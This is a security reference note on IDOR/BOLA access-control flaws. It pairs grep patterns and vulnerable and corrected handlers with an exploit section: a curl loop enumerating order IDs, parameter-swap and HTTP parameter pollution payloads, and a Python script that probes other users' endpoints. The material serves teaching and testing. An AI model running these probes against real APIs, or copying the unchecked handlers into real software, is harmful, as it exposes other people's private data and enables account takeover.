# IDOR & BOLA — Broken Object Level Authorization

**Tags:** #high #idor #bola #unauthorized-access #api #access-control
**OWASP:** A01:2021 Broken Access Control / API1:2023 BOLA
**CVSS Base:** 7.5 (High → access to other users' data without authentication)

---

## 📖 What is it

**IDOR (Insecure Direct Object Reference):** references to internal objects (database IDs, file names) are exposed and manipulable by the user, without ownership verification.

**BOLA (Broken Object Level Authorization):** the modern version of IDOR for stateless REST architectures. The auth token proves *who* the user is, but the data layer does not validate whether the accessed ID belongs to the authenticated user.

It is the **#1 vulnerability in REST APIs** according to the OWASP API Security Top 10.

---

## 🔍 `grep_search` Tactics

```
req.params.id
req.params.userId
[FromRoute] int id
$_GET['id']
getById(
findById(
findOne({_id:
WHERE id =
params['id']
params[:id]
```

**What to look for:** the instruction immediately after the ID extraction.  
If it calls `findById(id)` without cross-referencing `Session.UserID` or without a Policy/Guard → **vulnerability confirmed**.

---

## 🎯 High-Risk Contexts

| Endpoint | Risk |
|---|---|
| `GET /api/orders/{id}` | View other users' orders |
| `GET /api/users/{id}/profile` | Access private profiles |
| `PUT /api/users/{id}/password` | Change another user's password |
| `DELETE /api/posts/{id}` | Delete someone else's content |
| `GET /api/invoices/{id}/download` | Download invoices from other accounts |
| `GET /api/messages/{threadId}` | Read other users' private messages |

---

## 💣 Vulnerable Patterns

```python
#  VULNERABLE — Flask
@app.get('/api/orders/<int:order_id>')
def get_order(order_id):
    order = Order.query.get(order_id)  # fetches any order by ID
    # No ownership check!
    return jsonify(order.to_dict())
```

```javascript
//  VULNERABLE — Express
app.get('/api/users/:id/documents', async (req, res) => {
    const docs = await Document.find({ userId: req.params.id });
    // req.params.id comes from the URL → controlled by the attacker
    // Does not verify that req.user.id === req.params.id
    res.json(docs);
});
```

```csharp
//  VULNERABLE — ASP.NET
[HttpGet("/api/invoices/{id}")]
public IActionResult GetInvoice([FromRoute] int id)
{
    var invoice = _db.Invoices.Find(id);
    // Does not verify that invoice.UserId == currentUser.Id
    return Ok(invoice);
}
```

---

## ✅ Correct Patterns

```python
#  CORRECT — Flask with ownership check
@app.get('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id  # filters by the CURRENT user, not the parameter
    ).first_or_404()
    return jsonify(order.to_dict())
```

```javascript
//  CORRECT — Express
app.get('/api/users/:id/documents', async (req, res) => {
    // Verify that the authenticated user owns the resource
    if (req.user.id !== parseInt(req.params.id) && !req.user.isAdmin) {
        return res.status(403).json({ error: 'Access denied' });
    }
    const docs = await Document.find({ userId: req.params.id });
    res.json(docs);
});
```

```python
#  CORRECT — Django
def get_document(request, doc_id):
    doc = get_object_or_404(Document, id=doc_id, owner=request.user)
    # Django raises 404 if not found (without leaking that it exists but doesn't belong to the user)
    return JsonResponse(doc.to_dict())
```

---

## 💣 Exploit Techniques

### Sequential ID Enumeration
```bash
# Sequential brute force — numeric IDs are enumerable
for i in {1..1000}; do
    curl -s -H "Authorization: Bearer $MY_TOKEN" \
    "http://target.com/api/orders/$i" | grep -v "Access Denied"
done
```

### ID Swapping in Requests
```bash
# My order is #1337 — trying to access #1
GET /api/orders/1 HTTP/1.1
Authorization: Bearer <my_token>
# → If it returns another user's data = IDOR confirmed
```

### IDOR in Hidden Parameters
```bash
# References not only in the path, but also in the body/query
POST /api/update-profile
{"user_id": 1, "email": "attacker@evil.com"}
#              swap for another user's ID
```

### UUIDs Do Not Solve IDOR
```
# UUIDs reduce enumeration, but do not eliminate IDOR
# If a UUID is exposed in an API response → it can be accessed out of context
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
# If there is no ownership check, UUIDs provide no protection
```

### [NEW] HPP (HTTP Parameter Pollution) for BOLA
**How it works:** Some WAFs or app layers only validate the first occurrence of a parameter.
**Attack:**
`GET /api/user/details?id=MY_ID&id=VICTIM_ID`
If the app uses the *last* parameter for the DB query but the WAF only checks the *first* one against a permissions list, the bypass is successful.

### [NEW] Action-Based IDOR (Beyond Data Read)
**How it works:** Identifying IDORs in endpoints that perform sensitive actions.
**Examples:**
- `POST /api/user/{id}/reset-mfa`
- `POST /api/invite/accept/{inviteId}`
- `PUT /api/subscription/{id}/cancel` (Cancel someone else's plan)

---

## 🧪 Test Script

```python
# .tmp/validate_idor.py
import requests

TARGET = "http://target.com"
MY_TOKEN = "eyJ..."           # Your authentication token
MY_USER_ID = 42               # Your own user ID
TEST_USER_ID = 1              # Test access to admin/another user

ENDPOINTS_TO_TEST = [
    f"/api/users/{TEST_USER_ID}",
    f"/api/users/{TEST_USER_ID}/orders",
    f"/api/users/{TEST_USER_ID}/documents",
    f"/api/invoices/{TEST_USER_ID}",
]

headers = {"Authorization": f"Bearer {MY_TOKEN}"}

for ep in ENDPOINTS_TO_TEST:
    r = requests.get(f"{TARGET}{ep}", headers=headers, timeout=5)
    if r.status_code == 200:
        print(f"[IDOR CONFIRMED] {ep}")
        print(f"  Data: {r.text[:200]}")
    else:
        print(f"[blocked] {ep} (status: {r.status_code})")
```

---

## 🔗 Chain Exploits

```
IDOR on /users/{id}/password → Reset any user's password → Account Takeover
IDOR on /admin/{id} → Access admin panel without being an admin
IDOR + Mass Assignment → Update another user's role to admin
IDOR on invoice endpoint + PII → LGPD/GDPR violation with third-party data
IDOR on private messages → Corporate espionage
```

---

## 📌 References
- [[business-logic-flaws]]
- [[mass-assignment]]
- [[authentication-session-management]]
- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)